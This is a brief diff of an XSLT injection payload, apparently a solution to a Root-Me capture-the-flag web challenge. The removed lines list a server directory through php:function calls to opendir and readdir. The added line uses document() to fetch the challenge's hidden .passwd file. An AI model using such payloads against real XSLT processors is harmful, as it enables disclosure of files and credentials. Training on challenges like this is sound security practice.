@@ -1,6 +1,5 @@
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
     <xsl:template match="/">
-       <xsl:value-of select="php:function('opendir','/web-serveur/ch50/')"/>
-       <xsl:value-of select="php:function('readdir','')">
+       <xsl:copy-of select="document('http://challenge01.root-me.org/web-serveur/ch50/.passwd')"/>
     </xsl:template>
 </xsl:stylesheet>
